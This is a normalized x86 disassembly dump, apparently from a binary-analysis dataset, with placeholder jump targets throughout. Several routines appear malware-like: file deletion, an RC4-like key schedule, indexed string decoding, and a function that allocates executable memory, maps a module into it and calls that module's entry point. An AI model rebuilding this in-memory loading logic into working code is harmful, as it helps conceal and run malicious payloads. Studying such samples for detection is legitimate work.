xor eax eax
mov [ ebp - 0x458 ] ax
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_10054bf0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x234 ]
push edx
call sub_10050cb0
cmp eax ebx
je r-xdata
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
mov esi [ ebp - 0x498 ]
xor edx edx
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] dx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x234 ]
push edx
call [ DeleteFileW@IAT ]
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
lea eax [ ebp - 0x234 ]
push eax
call [ DeleteFileW@IAT ]
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] dx
mov [ ebp - 0x4 ] 0x1
call sub_10054bf0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov ecx [ ebp - 0x458 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x484 ]
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x4 ] 0x1
call sub_10054bf0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov eax [ ebp - 0x458 ]
push eax
call sub_1000a86e
add esp 0x4
xor edx edx
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] dx
mov [ ebp - 0x4 ] 0x1
call sub_10054bf0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov ecx [ ebp - 0x458 ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0x498 ]
xor ecx ecx
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x47c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] ax
call sub_10030710
xor eax eax
mov edx [ ebp - 0x47c ]
push edx
call sub_1000a86e
add esp 0x4
xor ecx ecx
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
call sub_10030710
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0x47c ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
sub_100261f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add ecx 0x8
push ecx
push eax
call sub_1001418e
add esp 0x8
test [ ebp + 0x8 ] ax
mov eax 0x0
setne al
pop ebp
retn 0x8
sub_10026213
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_1001b2d2
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_10026266
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100262a0
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
call sub_10019274
mov ecx [ esi + 0x10 ]
push ecx
call sub_10019274
mov edx [ esi + 0x14 ]
push edx
call sub_10019274
add esp 0xc
pop esi
retn
sub_100262e0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xcc
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_10026320
push ebp
mov ebp esp
push 0xffffffff
push sub_10087a54
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_10072180
mov eax [ esi + 0xb4 ]
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ esi + 0xb8 ]
lea edx [ esi + 0xc0 ]
push edx
push ecx
push eax
call sub_1001feb0
mov edx [ esi + 0xb4 ]
push edx
call sub_1000a86e
add esp 0x14
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
call sub_10031020
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
sub_10026420
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_1005b670
mov [ eax ] 0xc
call sub_1005b670
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_10030bed
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_1005b670
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_1002f1fa
pop ecx
mov [ edi ] eax
call sub_1004b131
call esi
push eax
call sub_1002f1fa
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_10026520
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
xor edi edi
mov ecx 0x2
xor esi esi
mov edi edi
xor edx edx
lea eax [ ecx - 0x2 ]
mov [ esi + rw-data ] eax
lea eax [ ecx - 0x2 ]
div ebx
mov eax [ ebp + 0x8 ]
add esi 0x10
movzx edx [ edx + eax ]
mov [ ebp + esi - 0x414 ] edx
xor edx edx
lea eax [ ecx - 0x1 ]
mov [ esi + rw-data ] eax
lea eax [ ecx - 0x1 ]
div ebx
mov eax [ ebp + 0x8 ]
movzx edx [ edx + eax ]
mov [ ebp + esi - 0x410 ] edx
xor edx edx
mov eax ecx
div ebx
mov eax [ ebp + 0x8 ]
mov [ esi + rw-data ] ecx
movzx edx [ edx + eax ]
mov [ ebp + esi - 0x40c ] edx
lea eax [ ecx + 0x1 ]
mov [ esi + rw-data ] eax
xor edx edx
div ebx
mov eax [ ebp + 0x8 ]
add ecx 0x4
movzx edx [ edx + eax ]
mov [ ebp + esi - 0x408 ] edx
lea eax [ ecx - 0x2 ]
cmp eax 0x100
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + rw-data ]
mov ecx [ ebp + eax - 0x404 ]
add ecx edx
add ecx edi
and ecx 0x800000ff
jns r-xdata
mov esi [ ecx * 4 + rw-data ]
mov [ eax + rw-data ] esi
mov esi [ ebp + eax - 0x400 ]
mov [ ecx * 4 + rw-data ] edx
mov edx [ eax + rw-data ]
add esi edx
add ecx esi
and ecx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov esi [ ecx * 4 + rw-data ]
mov [ eax + rw-data ] esi
mov esi [ ebp + eax - 0x3fc ]
mov [ ecx * 4 + rw-data ] edx
mov edx [ eax + rw-data ]
add esi edx
add ecx esi
and ecx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov esi [ ecx * 4 + rw-data ]
mov edi [ ebp + eax - 0x3f8 ]
mov [ eax + rw-data ] esi
mov [ ecx * 4 + rw-data ] edx
mov edx [ eax + rw-data ]
add edi edx
add edi ecx
and edi 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov ecx [ edi * 4 + rw-data ]
mov [ eax + rw-data ] ecx
add eax 0x10
mov [ edi * 4 + rw-data ] edx
cmp eax 0x400
jl r-xdata
dec edi
or edi 0xffffff00
inc edi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100266c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x78 ] eax
inc edi
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x70 ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
push ebx
push esi
push 0x2
mov [ ebp - 0x54 ] edx
pop esi
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
xor eax eax
jmp r-xdata
add edx esi
jmp r-xdata
cmp eax 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10032529
leave
retn
movzx eax [ edx ]
cmp eax 0x20
je r-xdata
cmp eax 0xa
je r-xdata
cmp eax 0xd
jne r-xdata
push 0x30
pop ebx
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10026dd2 ]
movzx eax [ edx ]
add edx esi
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x5c ] edi
cmp cx 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
mov [ ebp - 0x5c ] edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] edi
jne r-xdata
add eax 0xffffffd0
mov [ ebp - 0x6c ] edi
cmp ax 0x9
ja r-xdata
lea ecx [ edx - 0x4 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
mov [ ebp - 0x60 ] edi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] edi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x78 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
je r-xdata
cmp ax bx
jae r-xdata
cmp ax bx
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp ax bx
je r-xdata
cmp ax bx
jmp r-xdata
push 0xa
pop ecx
sub edx esi
sub eax 0x2b
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp ax bx
jae r-xdata
mov [ ebp - 0x70 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
sub eax 0x2b
je r-xdata
push 0x5
cmp eax 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp eax ebx
je r-xdata
cmp ax 0x39
ja r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
movzx eax ax
cmp eax ecx
je r-xdata
cmp ax 0x39
ja r-xdata
movzx eax ax
jmp r-xdata
cmp ax bx
je r-xdata
pop ecx
sub edx esi
jmp r-xdata
push 0x7
jmp r-xdata
sub eax esi
je r-xdata
movzx eax [ edx ]
add edx esi
add eax 0xffffffcf
cmp ax 0x8
jbe r-xdata
jne r-xdata
sub eax esi
je r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
mov eax [ ebp - 0x58 ]
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
mov ecx esi
jmp r-xdata
sub eax esi
je r-xdata
sub edx esi
push 0xb
jmp r-xdata
cmp eax 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp eax 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
movzx eax [ edx ]
add edx esi
jmp r-xdata
or [ ebp - 0x64 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
sub edx esi
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x68 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movzx edi ax
lea ecx [ ecx + edi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x58 ]
dec eax
inc [ ebp - 0x50 ]
jmp r-xdata
inc [ ebp - 0x9 ]
mov ecx esi
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax ebx
je r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
inc [ ebp - 0x4c ]
sub al bl
inc [ ebp - 0x58 ]
mov [ ecx ] al
jmp r-xdata
cmp eax 0x2d
je r-xdata
movzx eax [ edx ]
add edx esi
inc [ ebp - 0x4c ]
mov ecx [ ebp - 0x58 ]
sub al bl
inc [ ebp - 0x58 ]
dec [ ebp - 0x50 ]
mov [ ecx ] al
cmp ax bx
jae r-xdata
mov ecx 0x1451
movzx eax [ edx ]
add edx esi
dec eax
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp eax 0x43
jle r-xdata
movzx eax [ edx ]
add edx esi
jmp r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10069e16
mov eax [ ebp - 0x68 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x64 ] edx
jge r-xdata
cmp eax 0x45
jle r-xdata
movzx eax [ edx ]
add edx esi
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
add eax 0xffffff9c
cmp eax edi
ja r-xdata
cmp [ ebp - 0x6c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x70 ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi + 0x2 ] esi
pop esi
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x70 ]
mov [ edi ] cx
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x70 ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x78 ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x78 ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x4c ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x64 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x5c ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x64 ]
dec [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x6c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
add eax eax
mov [ ebp - 0x68 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x50 ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x68 ]
cmp [ ebp - 0x68 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x50 ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x6c ]
mov edx [ ebp - 0x60 ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x50 ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x58 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x58 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x4c ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x4c ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10026e10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100888dd
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x847c
call sub_10080420
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8478 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8490 ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x8 ] 0x0
mov [ esp + 0x20 ] edi
jne r-xdata
xor eax eax
push 0x831c
push eax
lea ecx [ esp + 0x16e ]
push ecx
mov [ esp + 0x170 ] ax
call sub_1007f8f0
add esp 0xc
cmp [ edi + 0x98 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ edi + 0x78 ]
mov ecx [ ecx + 0x78 ]
test ecx ecx
jne r-xdata
mov edx [ edi + 0x90 ]
push edx
lea esi [ edi + 0x70 ]
push esi
call sub_10011f90
mov eax [ edi + 0x78 ]
mov eax [ eax + 0x50 ]
push 0x40
push 0x3000
push eax
push 0x0
mov [ edi + 0x9c ] eax
call [ VirtualAlloc@IAT ]
mov [ edi + 0x98 ] eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x8490 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x8478 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8c ]
cmp [ eax + ecx + 0x14 ] 0x2
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x50 ]
mov ecx [ esi + 0x1c ]
push edx
push ecx
push eax
call sub_1007f580
mov edx [ edi + 0x98 ]
add esp 0xc
push edx
mov eax esi
call sub_100578a0
test eax eax
je r-xdata
lea edx [ esp + 0x94 ]
mov eax 0xb
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10029ef0
add esp 0x8
mov esi 0x8
mov edx eax
mov ecx esi
mov [ esp + 0x8498 ] 0x0
call sub_10022b50
mov [ esp + 0x8498 ] 0xffffffff
cmp [ esp + 0x38 ] esi
jb r-xdata
mov edx [ eax + ecx + 0x1c ]
lea eax [ edx + eax + 0x4 ]
mov eax [ eax ]
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x98 ]
add ecx eax
mov [ esp + 0x18 ] ecx
jne r-xdata
mov ebx [ edi + 0x98 ]
mov eax esi
call sub_10003ee0
test eax eax
je r-xdata
lea edx [ esp + 0x94 ]
mov eax 0xb4
call sub_10069020
mov eax edx
push eax
lea ecx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x8
mov [ esp + 0x8498 ] 0x1
call sub_10022b50
lea ecx [ esp + 0x24 ]
mov [ esp + 0x8498 ] 0xffffffff
call sub_100702e0
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov eax 0x3
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov eax 0x2
jmp r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ esp + 0x104 ]
mov eax 0x4f
call sub_10069020
lea edx [ esp + 0x128 ]
mov eax 0xc7
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0x7c ]
lea ebx [ edi + 0xc ]
push edx
call sub_10029ef0
push eax
lea edx [ esp + 0x110 ]
lea esi [ esp + 0x4c ]
mov [ esp + 0x84a4 ] 0x4
call sub_100519f0
add esp 0xc
push eax
lea edx [ esp + 0x168 ]
lea esi [ esp + 0x60 ]
mov [ esp + 0x849c ] 0x5
call sub_100519f0
add esp 0x4
mov esi 0x8
mov edx eax
mov ecx esi
mov [ esp + 0x8498 ] 0x6
call sub_10022b50
cmp [ esp + 0x70 ] esi
jb r-xdata
lea edx [ esp + 0x94 ]
mov eax 0x96
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10029ef0
add esp 0x8
mov esi 0x8
mov edx eax
mov ecx esi
mov [ esp + 0x8498 ] 0x3
call sub_10022b50
cmp [ esp + 0x38 ] esi
jb r-xdata
mov eax [ edi + 0x78 ]
mov ecx [ eax + 0x28 ]
mov eax [ edi + 0x98 ]
push 0x0
push 0x1
add ecx eax
push eax
call ecx
lea edx [ esp + 0x94 ]
mov eax 0x139
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x8
mov [ esp + 0x8498 ] 0x2
call sub_10022b50
lea ecx [ esp + 0x24 ]
mov [ esp + 0x8498 ] 0xffffffff
call sub_100702e0
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax 0x4
jmp r-xdata
xor ebx ebx
xor ecx ecx
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] cx
cmp [ esp + 0x54 ] esi
jb r-xdata
mov eax [ esp + 0x5c ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x5
jmp r-xdata
mov eax [ esp + 0x24 ]
